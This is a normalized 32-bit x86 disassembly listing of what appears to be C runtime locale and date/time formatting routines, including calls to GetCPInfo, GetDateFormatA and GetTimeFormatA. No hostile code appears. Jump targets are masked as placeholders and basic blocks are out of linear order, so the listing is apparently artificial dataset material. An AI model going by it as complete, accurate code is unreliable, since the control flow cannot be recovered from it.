push [ ebp - 0x4 ]
call sub_2009d98
add esp 0x10
jmp r-xdata
pop ecx
jmp r-xdata
push [ esi + 0xbc ]
call sub_2009d98
push [ esi + 0xb0 ]
call sub_2009d98
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x8 ]
add eax 0xbc
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebx ] ecx
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov [ ebx + 0x4 ] ecx
mov eax [ eax ]
mov eax [ eax + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov [ ebx + 0x8 ] eax
xor eax eax
inc eax
xor edi edi
mov [ ecx ] eax
cmp [ ebp - 0x4 ] edi
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
lea edi [ esi + 0x1 ]
mov cl [ edi ]
mov [ esi ] cl
mov esi edi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_201b8b9
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4c ] esi
mov [ ebp - 0x48 ] ebx
cmp [ esi + 0x14 ] ebx
je r-xdata
lea edi [ esi + 0xc0 ]
mov eax [ edi ]
cmp eax ebx
je r-xdata
lea eax [ esi + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov [ edi ] ebx
mov [ esi + 0xc4 ] ebx
mov [ esi + 0xc8 ] r--data
mov [ esi + 0xcc ] r--data
mov [ esi + 0xd0 ] r--data
mov [ esi + 0xac ] 0x1
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
push 0x4
call sub_201a99e
push 0x2
mov edi 0x180
push edi
mov [ ebp - 0x2c ] eax
call sub_201a9e3
push 0x1
push edi
mov [ ebp - 0x1c ] eax
call sub_201a9e3
push 0x1
push edi
mov [ ebp - 0x20 ] eax
call sub_201a9e3
push 0x1
push 0x101
mov [ ebp - 0x28 ] eax
call sub_201a9e3
add esp 0x24
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x2c ] ebx
je r-xdata
push eax
movzx eax [ esi + 0x30 ]
push 0x1004
push eax
lea eax [ ebp - 0x4c ]
push ebx
push eax
call sub_2018ff5
add esp 0x14
test eax eax
jne r-xdata
push [ ebp - 0x2c ]
call sub_2009d98
push [ ebp - 0x1c ]
call sub_2009d98
push [ ebp - 0x20 ]
call sub_2009d98
push [ ebp - 0x28 ]
call sub_2009d98
xor ebx ebx
add esp 0x10
inc ebx
jmp r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push [ ebp - 0x24 ]
call sub_2009d98
pop ecx
mov eax ebx
jmp r-xdata
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_200b53e
leave
retn
cmp [ ebp - 0x20 ] ebx
je r-xdata
cmp [ ebp - 0x28 ] ebx
je r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] ebx
xor eax eax
mov ecx [ ebp - 0x24 ]
mov [ eax + ecx ] al
inc eax
cmp eax 0x100
jl r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x5
ja r-xdata
movzx eax [ ebp - 0x18 ]
cmp eax 0x1
mov [ ebp - 0x30 ] eax
jle r-xdata
mov eax [ ebp - 0x1c ]
push ebx
push ebx
push [ esi + 0x4 ]
add eax 0x100
push eax
push 0x100
push [ ebp - 0x24 ]
mov [ ebp - 0x40 ] eax
push 0x1
push ebx
call sub_201ac89
add esp 0x20
test eax eax
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x24 ]
push ebx
push [ esi + 0x4 ]
mov edi 0xff
push edi
add ecx 0x81
push ecx
push edi
inc eax
push eax
push 0x100
push [ esi + 0x14 ]
push ebx
call sub_2014550
add esp 0x24
test eax eax
je r-xdata
lea eax [ ebp - 0x11 ]
mov eax [ ebp - 0x28 ]
push ebx
push [ esi + 0x4 ]
add eax 0x81
push edi
push eax
mov eax [ ebp - 0x24 ]
push edi
inc eax
push eax
push 0x200
push [ esi + 0x14 ]
push ebx
call sub_2014550
add esp 0x24
test eax eax
je r-xdata
movzx edi [ eax - 0x1 ]
movzx ecx cl
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov edi [ ebp - 0x20 ]
lea ecx [ eax + 0xfe ]
xor edx edx
cmp [ ebp - 0x30 ] 0x1
mov [ ecx ] dx
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x3c ] ecx
lea ecx [ edi + 0x80 ]
mov [ edi + 0x7f ] bl
mov [ edx + 0x7f ] bl
mov [ ecx ] bl
mov [ ebp - 0x44 ] ecx
lea ecx [ edx + 0x80 ]
mov [ ebp - 0x38 ] ecx
mov [ ecx ] bl
jle r-xdata
cmp edi ecx
jle r-xdata
push 0xfe
lea ecx [ eax + 0x200 ]
push ecx
push eax
call sub_2013e10
push 0x7f
lea eax [ edi + 0x100 ]
push eax
push edi
call sub_2013e10
mov eax [ ebp - 0x28 ]
push 0x7f
lea ecx [ eax + 0x100 ]
push ecx
push eax
call sub_2013e10
mov eax [ esi + 0xc0 ]
add esp 0x24
cmp eax ebx
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x24 ]
mov [ edi + ecx ] 0x20
movzx ecx [ eax ]
inc edi
inc eax
inc eax
cmp [ eax - 0x1 ] bl
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] 0x1
mov [ esi + 0xc0 ] eax
mov eax [ ebp - 0x40 ]
mov [ esi + 0xc8 ] eax
mov eax [ ebp - 0x3c ]
mov [ esi + 0xc4 ] eax
mov eax [ ebp - 0x44 ]
mov [ esi + 0xcc ] eax
mov eax [ ebp - 0x38 ]
mov [ esi + 0xd0 ] eax
mov eax [ ebp - 0x30 ]
mov [ esi + 0xac ] eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x11 ]
mov [ ebp - 0x1c ] ecx
mov cl [ eax ]
cmp cl bl
je r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_2009d98
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_2009d98
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_2009d98
push [ esi + 0xc0 ]
call sub_2009d98
add esp 0x10
movzx ecx [ ecx - 0x1 ]
movzx edx dl
cmp ecx edx
mov [ ebp - 0x20 ] ecx
jg r-xdata
mov ecx [ ebp - 0x1c ]
inc ecx
inc ecx
mov [ ebp - 0x1c ] ecx
cmp [ ecx - 0x1 ] bl
jne r-xdata
lea ecx [ eax + ecx * 2 + 0x100 ]
jmp r-xdata
mov dl [ ecx ]
cmp dl bl
je r-xdata
inc [ ebp - 0x20 ]
mov edx 0x8000
mov [ ecx ] dx
inc ecx
inc ecx
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp - 0x1c ]
movzx ecx [ ecx ]
cmp [ ebp - 0x20 ] ecx
jle r-xdata
mov ecx [ ebp - 0x34 ]
sub_201bd12
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x18 ]
xor ebx ebx
call sub_20099ee
mov eax [ ebp - 0x18 ]
mov edi [ eax + 0xd4 ]
mov [ ebp - 0x4 ] ebx
mov esi [ ebp - 0x4 ]
shl esi 0x2
push [ esi + edi + 0x1c ]
call sub_2016140
push [ esi + edi ]
mov [ ebp - 0x8 ] eax
call sub_2016140
add eax ebx
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x7
pop ecx
pop ecx
mov ecx [ ebp - 0x8 ]
lea ebx [ eax + ecx + 0x2 ]
jb r-xdata
lea eax [ ebx + 0x1 ]
push eax
call sub_201a99e
mov esi eax
pop ecx
mov [ ebp - 0x8 ] esi
test esi esi
je r-xdata
cmp [ ebp - 0xc ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x8 ]
leave
retn
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
call sub_2016140
add esi eax
mov eax [ ebp - 0x4 ]
mov [ esi ] 0x3a
push [ edi + eax * 4 + 0x1c ]
mov eax [ ebp - 0x8 ]
inc esi
sub eax esi
lea eax [ eax + ebx + 0x1 ]
push eax
push esi
call sub_200a6e1
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_200f929
add esp 0x14
push esi
call sub_2016140
add esi eax
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x7
pop ecx
jb r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_200f929
add esp 0x14
mov eax [ ebp - 0x4 ]
mov [ esi ] 0x3a
push [ edi + eax * 4 ]
mov eax [ ebp - 0x8 ]
inc esi
sub eax esi
lea eax [ eax + ebx + 0x1 ]
push eax
push esi
call sub_200a6e1
add esp 0xc
test eax eax
je r-xdata
mov [ esi ] 0x0
sub_201be1b
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x1c ]
xor ebx ebx
call sub_20099ee
mov eax [ ebp - 0x1c ]
mov edi [ eax + 0xd4 ]
lea esi [ edi + 0x38 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] 0xc
push [ esi + 0x30 ]
call sub_2016140
push [ esi ]
mov [ ebp - 0xc ] eax
call sub_2016140
mov esi [ ebp - 0x4 ]
pop ecx
pop ecx
mov ecx [ ebp - 0xc ]
add eax ebx
add esi 0x4
dec [ ebp - 0x8 ]
lea ebx [ eax + ecx + 0x2 ]
mov [ ebp - 0x4 ] esi
jne r-xdata
lea eax [ ebx + 0x1 ]
push eax
call sub_201a99e
mov esi eax
pop ecx
mov [ ebp - 0x4 ] esi
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
add edi 0x68
mov [ ebp - 0x8 ] 0xc
mov eax [ ebp - 0x4 ]
leave
retn
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
call sub_2016140
add esi eax
mov eax [ ebp - 0x4 ]
mov [ esi ] 0x3a
push [ edi ]
inc esi
sub eax esi
lea eax [ eax + ebx + 0x1 ]
push eax
push esi
call sub_200a6e1
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_200f929
add esp 0x14
push esi
call sub_2016140
add esi eax
add edi 0x4
dec [ ebp - 0x8 ]
pop ecx
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_200f929
add esp 0x14
mov eax [ ebp - 0x4 ]
mov [ esi ] 0x3a
push [ edi - 0x30 ]
inc esi
sub eax esi
lea eax [ eax + ebx + 0x1 ]
push eax
push esi
call sub_200a6e1
add esp 0xc
test eax eax
je r-xdata
mov [ esi ] 0x0
sub_201bf24
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x24 ]
xor edi edi
call sub_20099ee
mov eax [ ebp - 0x24 ]
mov esi [ eax + 0xd4 ]
mov [ ebp - 0x4 ] edi
mov ebx [ ebp - 0x4 ]
shl ebx 0x2
push [ ebx + esi + 0x1c ]
call sub_2016140
push [ ebx + esi ]
mov [ ebp - 0x14 ] eax
call sub_2016140
add eax edi
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x7
pop ecx
pop ecx
mov ecx [ ebp - 0x14 ]
lea edi [ eax + ecx + 0x2 ]
jb r-xdata
lea eax [ esi + 0x38 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xc
mov ebx [ ebp - 0x10 ]
push [ ebx + 0x30 ]
call sub_2016140
push [ ebx ]
mov [ ebp - 0x14 ] eax
call sub_2016140
add [ ebp - 0x10 ] 0x4
pop ecx
pop ecx
mov ecx [ ebp - 0x14 ]
add eax edi
dec [ ebp - 0xc ]
lea edi [ eax + ecx + 0x2 ]
jne r-xdata
push [ esi + 0x9c ]
call sub_2016140
push [ esi + 0x98 ]
mov ebx eax
call sub_2016140
push [ esi + 0xa0 ]
add eax edi
lea edi [ eax + ebx + 0x2 ]
call sub_2016140
push [ esi + 0xa4 ]
lea edi [ edi + eax + 0x1 ]
call sub_2016140
push [ esi + 0xa8 ]
lea edi [ edi + eax + 0x1 ]
call sub_2016140
lea eax [ edi + eax + 0xb9 ]
push eax
mov [ ebp - 0x8 ] eax
call sub_201a99e
mov ebx eax
add esp 0x18
test ebx ebx
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0xb8
push esi
push ebx
lea edi [ ebx + 0xb8 ]
call sub_2013e10
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x1c ]
mov [ ebp - 0x10 ] ebx
add esp 0xc
sub [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] eax
pop edi
pop esi
mov eax ebx
pop ebx
leave
retn
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
push edi
call sub_2016140
mov ecx [ ebp - 0x10 ]
lea edi [ edi + eax + 0x1 ]
mov eax [ ebp - 0xc ]
mov [ ecx + eax ] edi
push [ eax ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
push eax
push edi
call sub_200a6e1
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_200f929
add esp 0x14
push edi
call sub_2016140
inc [ ebp - 0x4 ]
add [ ebp - 0xc ] 0x4
cmp [ ebp - 0x4 ] 0x7
pop ecx
lea edi [ edi + eax + 0x1 ]
jb r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_200f929
add esp 0x14
mov eax [ ebp - 0x4 ]
mov [ ebx + eax * 4 ] edi
mov eax [ ebp - 0xc ]
push [ eax - 0x1c ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
push eax
push edi
call sub_200a6e1
add esp 0xc
test eax eax
je r-xdata
lea eax [ ebx + 0x68 ]
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x38 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x14 ] 0xc
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ eax + ecx ] edi
push [ eax ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
push eax
push edi
call sub_200a6e1
add esp 0xc
test eax eax
je r-xdata
push edi
call sub_2016140
lea edi [ edi + eax + 0x1 ]
mov eax [ ebp - 0x4 ]
mov [ eax ] edi
mov eax [ ebp - 0xc ]
push [ eax + 0x30 ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
push eax
push edi
call sub_200a6e1
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_200f929
add esp 0x14
push edi
call sub_2016140
add [ ebp - 0xc ] 0x4
add [ ebp - 0x4 ] 0x4
dec [ ebp - 0x14 ]
pop ecx
lea edi [ edi + eax + 0x1 ]
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_200f929
add esp 0x14
mov eax [ ebp - 0xc ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
mov [ ebx + 0x98 ] edi
push [ esi + 0x98 ]
push eax
push edi
call sub_200a6e1
add esp 0xc
test eax eax
je r-xdata
push edi
call sub_2016140
lea edi [ edi + eax + 0x1 ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
mov [ ebx + 0x9c ] edi
push [ esi + 0x9c ]
push eax
push edi
call sub_200a6e1
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_200f929
add esp 0x14
push edi
call sub_2016140
lea edi [ edi + eax + 0x1 ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
mov [ ebx + 0xa0 ] edi
push [ esi + 0xa0 ]
push eax
push edi
call sub_200a6e1
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_200f929
add esp 0x14
push edi
call sub_2016140
lea edi [ edi + eax + 0x1 ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
mov [ ebx + 0xa4 ] edi
push [ esi + 0xa4 ]
push eax
push edi
call sub_200a6e1
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_200f929
add esp 0x14
push edi
call sub_2016140
lea eax [ edi + eax + 0x1 ]
mov ecx ebx
sub ecx eax
add ecx [ ebp - 0x8 ]
mov [ ebx + 0xa8 ] eax
push [ esi + 0xa8 ]
push ecx
push eax
call sub_200a6e1
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_200f929
add esp 0x14
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_200f929
add esp 0x14
sub_201c284
cmp [ eax ] 0x0
push esi
mov esi edx
je r-xdata
pop esi
retn
push edi
pop edi
mov edi [ ecx ]
mov [ edi ] dl
inc [ ecx ]
inc esi
dec [ eax ]
cmp [ eax ] 0x0
jne r-xdata
mov dl [ esi ]
test dl dl
je r-xdata
sub_201c2a4
cmp [ esi ] 0x1
mov ecx [ edi ]
push ebx
jbe r-xdata
mov eax [ edi ]
mov [ edi ] ecx
dec ecx
push 0xa
cdq
pop ebx
idiv ebx
add dl 0x30
mov [ ecx ] dl
inc ecx
dec [ esi ]
mov edx [ esi ]
test eax eax
jle r-xdata
mov bl [ eax ]
mov dl [ ecx ]
mov [ ecx ] bl
dec ecx
mov [ eax ] dl
inc eax
cmp eax ecx
jb r-xdata
pop ebx
retn
cmp edx 0x1
ja r-xdata
sub_201c2da
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
xor edx edx
mov [ ebp - 0x4 ] edx
cmp [ ebp + 0x8 ] edx
je r-xdata
cmp esi [ ecx ]
jae r-xdata
cmp [ ecx ] 0x1
mov esi [ edi ]
jbe r-xdata
mov [ ecx ] edx
dec esi
lea edx [ esi + 0x1 ]
test edx edx
je r-xdata
mov eax [ edi ]
mov [ edi ] esi
dec esi
push 0xa
cdq
pop ebx
idiv ebx
add dl 0x30
mov [ esi ] dl
inc esi
dec [ ecx ]
mov edx [ ecx ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
add [ edi ] eax
sub [ ecx ] eax
jmp r-xdata
push 0xa
cdq
pop ebx
idiv ebx
mov ebx [ edi ]
add dl 0x30
inc [ ebp - 0x4 ]
mov [ esi + ebx ] dl
dec esi
cmp esi 0xffffffff
jne r-xdata
mov dl [ eax ]
mov cl [ esi ]
mov [ esi ] dl
dec esi
mov [ eax ] cl
inc eax
cmp eax esi
jb r-xdata
jmp r-xdata
cmp edx 0x1
ja r-xdata
pop esi
pop ebx
leave
retn
sub_201c355
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
movsx eax al
cmp eax 0x59
push esi
push edi
mov ebx ecx
mov esi edx
jg r-xdata
cmp eax 0x6d
jg r-xdata
je r-xdata
sub eax 0x70
je r-xdata
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0xfffff894
jl r-xdata
cmp eax 0x49
jg r-xdata
mov esi [ esi + 0x8 ]
xor edi edi
cmp esi edi
jl r-xdata
sub eax 0x7
je r-xdata
mov esi [ esi + 0x10 ]
xor edi edi
cmp esi edi
jl r-xdata
sub eax 0x5a
je r-xdata
call sub_200fb13
xor edi edi
jmp r-xdata
cmp eax 0x1fa3
jle r-xdata
sub eax 0x4d
je r-xdata
je r-xdata
call sub_200fb13
cmp esi 0x17
jg r-xdata
mov eax [ esi + 0x18 ]
xor edi edi
cmp eax edi
jl r-xdata
dec eax
je r-xdata
cmp esi 0xb
jg r-xdata
call sub_2019c04
call sub_201a097
mov edx eax
xor eax eax
cmp [ esi + 0x20 ] eax
mov ecx ebx
setne al
mov ebx eax
mov edx [ edx + ebx * 4 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub eax 0x7
je r-xdata
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
cdq
push 0x64
pop ecx
idiv ecx
push [ ebp + 0x14 ]
push 0x4
add eax 0x13
imul eax eax 0x64
add eax edx
jmp r-xdata
mov eax [ esi + 0x4 ]
jmp r-xdata
push 0x6
pop ecx
sub eax ecx
je r-xdata
mov eax [ esi + 0x8 ]
xor edi edi
cmp eax edi
jl r-xdata
sub eax 0x4
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp esi 0xb
mov edx [ ebp + 0x10 ]
jg r-xdata
cmp eax 0x6
jg r-xdata
push [ ebp + 0x10 ]
xor edi edi
push [ ebp + 0xc ]
push ebx
push esi
cmp [ ebp + 0x14 ] edi
je r-xdata
dec eax
je r-xdata
lea eax [ esi + 0x1 ]
jmp r-xdata
mov eax [ ebp + 0xc ]
call sub_201c284
mov esi [ esi + 0x18 ]
xor edi edi
cmp esi edi
jl r-xdata
dec eax
je r-xdata
pop edx
xor edi edi
cmp eax edi
jl r-xdata
mov eax [ esi ]
dec eax
dec eax
je r-xdata
cmp eax 0x17
jg r-xdata
xor eax eax
inc eax
sub eax 0x9
je r-xdata
mov edx [ edx + 0x9c ]
mov edx [ edx + 0x98 ]
jmp r-xdata
push [ ebp + 0x14 ]
xor edx edx
inc edx
jmp r-xdata
push edi
jmp r-xdata
push 0x1
jmp r-xdata
mov eax [ esi + 0x14 ]
xor edi edi
cmp eax edi
jl r-xdata
dec eax
jne r-xdata
push [ ebp + 0x14 ]
cmp esi 0x6
jle r-xdata
mov esi [ esi + 0x10 ]
xor edi edi
cmp esi edi
jl r-xdata
dec eax
je r-xdata
cmp eax 0x3b
jmp r-xdata
mov eax [ esi + 0x18 ]
xor edi edi
cmp eax edi
jl r-xdata
dec eax
dec eax
je r-xdata
cdq
push 0xc
pop ecx
idiv ecx
mov eax edx
cmp eax edi
jne r-xdata
sub eax 0x18
je r-xdata
mov ecx [ ebp + 0xc ]
mov edi ebx
call sub_201c2da
pop ecx
jmp r-xdata
push [ ebp + 0x8 ]
call sub_201c73d
add esp 0x18
test eax eax
jne r-xdata
push [ ebp + 0x14 ]
cdq
push 0x64
pop ecx
idiv ecx
mov eax edx
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp + 0x10 ]
mov edx [ edx + esi * 4 ]
jmp r-xdata
cmp esi 0xb
jg r-xdata
push [ ebp + 0x10 ]
xor edi edi
push [ ebp + 0xc ]
push ebx
push esi
cmp [ ebp + 0x14 ] edi
je r-xdata
dec eax
je r-xdata
jg r-xdata
cmp eax ecx
jg r-xdata
mov eax [ esi + 0x18 ]
xor edi edi
cmp eax edi
jl r-xdata
dec eax
jne r-xdata
push ecx
pop eax
jmp r-xdata
mov eax [ ebx ]
mov [ eax ] 0x25
mov eax [ ebp + 0xc ]
inc [ ebx ]
dec [ eax ]
jmp r-xdata
sub eax 0x1c
je r-xdata
jmp r-xdata
push 0x2
mov edx [ ebp + 0x10 ]
mov edx [ edx + esi * 4 + 0x38 ]
jmp r-xdata
push edi
jmp r-xdata
push 0x1
mov esi [ esi + 0xc ]
cmp esi 0x1
jl r-xdata
sub eax 0x6
jne r-xdata
jmp r-xdata
mov ecx eax
cmp eax ecx
jg r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
jmp r-xdata
mov esi [ esi + 0x18 ]
xor edi edi
cmp esi edi
jl r-xdata
dec eax
je r-xdata
push [ ebp + 0x8 ]
call sub_201c73d
add esp 0x18
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] edi
je r-xdata
cmp esi 0x1f
jg r-xdata
mov esi [ esi + 0x1c ]
xor edi edi
cmp esi edi
jl r-xdata
cmp eax 0x16d
jg r-xdata
cmp eax edi
je r-xdata
push ebx
push esi
push 0x2
cmp esi 0x6
jg r-xdata
mov esi [ esi + 0x10 ]
xor edi edi
cmp esi edi
jl r-xdata
sub eax 0x6
jne r-xdata
mov eax [ ebx ]
push [ ebp + 0x10 ]
mov [ eax ] 0x20
mov eax [ ebp + 0xc ]
inc [ ebx ]
dec [ eax ]
push eax
mov eax esi
cmp esi 0x16d
jg r-xdata
cmp eax ecx
jge r-xdata
mov eax [ esi + 0x1c ]
cmp eax edi
jl r-xdata
lea ecx [ eax - 0x1 ]
jmp r-xdata
mov edx [ ebp + 0x10 ]
mov edx [ edx + esi * 4 + 0x1c ]
jmp r-xdata
cmp esi 0xb
jg r-xdata
mov eax [ esi + 0x8 ]
xor edi edi
cmp eax edi
jl r-xdata
push [ ebp + 0x14 ]
lea eax [ esi + 0x1 ]
push 0x3
jmp r-xdata
push 0x7
cdq
pop esi
idiv esi
cmp edx ecx
jl r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp + 0x10 ]
mov edx [ edx + esi * 4 + 0x68 ]
jmp r-xdata
cmp eax 0x17
inc eax
jmp r-xdata
sub_201c73d
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x1c ]
xor ebx ebx
sub eax ebx
push edi
je r-xdata
mov edi [ esi + 0xa0 ]
dec eax
je r-xdata
mov al [ edi ]
test al al
je r-xdata
cmp [ ebp + 0xc ] 0x2
mov ecx [ GetDateFormatA@IAT ]
jne r-xdata
mov edi [ esi + 0xa4 ]
jmp r-xdata
mov edi [ esi + 0xa8 ]
jmp r-xdata
xor eax eax
inc eax
mov ebx [ ebp + 0x18 ]
mov esi [ ebp + 0x14 ]
mov edx 0x76c
add dx [ eax + 0x14 ]
push ebx
mov [ ebp - 0x20 ] dx
mov dx [ eax + 0x10 ]
inc dx
mov [ ebp - 0x1e ] dx
mov dx [ eax + 0xc ]
mov [ ebp - 0x1a ] dx
mov dx [ eax + 0x8 ]
mov [ ebp - 0x18 ] dx
mov dx [ eax + 0x4 ]
mov ax [ eax ]
mov [ ebp - 0x14 ] ax
push ebx
xor eax eax
push edi
mov [ ebp - 0x12 ] ax
lea eax [ ebp - 0x20 ]
push eax
push ebx
push [ esi + 0xac ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x16 ] dx
call ecx
mov [ ebp - 0x10 ] eax
cmp eax ebx
je r-xdata
mov ecx [ GetTimeFormatA@IAT ]
cmp [ esi + 0xb0 ] 0x1
mov eax [ ebp + 0x10 ]
je r-xdata
xor edx edx
mov [ ebp - 0x8 ] edx
mov ecx edi
add eax 0x8
cmp eax 0x400
jg r-xdata
inc ecx
inc edx
cmp [ ecx ] al
je r-xdata
mov [ ebp - 0xc ] ecx
movsx ecx al
cmp ecx 0x64
jg r-xdata
push eax
call sub_2009eef
pop ecx
cmp eax ebx
je r-xdata
call sub_2023130
mov eax esp
cmp eax ebx
je r-xdata
mov eax ecx
sub eax 0x68
je r-xdata
je r-xdata
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
mov eax edx
dec eax
je r-xdata
sub eax 0x5
je r-xdata
mov eax edx
dec eax
je r-xdata
cmp ecx 0x27
je r-xdata
push [ ebp - 0x10 ]
mov ebx eax
push ebx
push edi
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push [ esi + 0xac ]
call [ ebp - 0xc ]
dec eax
test eax eax
jle r-xdata
add eax 0x8
mov [ ebp - 0x8 ] 0x1
dec eax
je r-xdata
mov eax edx
dec eax
je r-xdata
sub eax 0x6
je r-xdata
mov [ ebp - 0x8 ] 0x1
dec eax
je r-xdata
add edi edx
test dl 0x1
je r-xdata
cmp ecx 0x41
je r-xdata
push [ ebp - 0x8 ]
call sub_201418b
pop ecx
mov esi [ ebp + 0x18 ]
mov ecx [ ebp + 0x14 ]
xor eax eax
jmp r-xdata
mov edi [ ebp - 0xc ]
jmp r-xdata
mov al 0x49
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
dec eax
je r-xdata
mov eax edx
dec eax
je r-xdata
dec eax
je r-xdata
push [ ebp - 0x8 ]
mov edx [ ebp + 0x10 ]
push [ ebp + 0x1c ]
mov ecx esi
push ebx
push [ ebp + 0x8 ]
call sub_201c355
add esp 0x10
test eax eax
je r-xdata
mov al 0x64
jmp r-xdata
dec eax
je r-xdata
mov al [ edi ]
test al al
jne r-xdata
mov al [ edi ]
test al al
je r-xdata
push r--data
push edi
call sub_2009a86
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp ecx 0x48
je r-xdata
mov edx [ ecx ]
mov [ ebp - 0x10 ] eax
mov al [ ebx ]
mov [ edx ] al
inc [ ecx ]
mov eax [ ebp - 0x10 ]
inc ebx
dec [ esi ]
dec eax
test eax eax
jg r-xdata
lea esp [ ebp - 0x2c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
